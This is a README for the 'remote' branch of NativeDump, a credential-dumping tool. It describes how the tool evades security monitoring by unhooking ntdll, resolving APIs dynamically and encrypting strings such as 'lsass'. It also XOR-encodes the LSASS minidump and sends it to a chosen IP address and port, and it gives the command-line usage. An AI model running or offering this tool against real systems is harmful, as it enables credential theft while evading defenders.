# NativeDump - "remote" branch

This branch implements:

- Ntdll.dll remapping by overwriting the process library ".text" section with the clean section from the file "C:\\Windows\\System32\\ntdll.dll"
- Dynamic function resolution using function delegates and custom implementations for GetModuleHandle and GetProcAddress
- AES encryption for all relevant strings in the program ("lsass", "lsasrv.dll", function names...)
- Send bytes to an IP address and Port instead of saving to a file
- XOR-encoding the Minidump file bytes

----------------------------

## Usage

```
NativeDump.exe [IP_ADDRESS] [PORT_NUMBER] [xor]
```

- IP_ADDRESS: IP address to connect to. Default value is "127.0.0.1".
- PORT_NUMBER: Port to connect to. Default value is 8080.
- "xor": Add the word "xor" after the IP address and port to XOR the Minidump file bytes with the default value 0xCC.

You can avoid using arguments changing these default values in the first lines of the Main function in Program.cs, included the XOR byte 0xCC (if you change it, update the Decoder project as well).

If you decide to use the XOR encoding you can use the Decoder like this:

```
Decoder.exe FILE [OUTPUT_FILE]
```

## Example

Using the default values:

![send](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_Transfer1.png)

![receive](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_Transfer2.png)

Using XOR-encoding:

![send](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_Transfer3.png)

![receive](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_Transfer4.png)

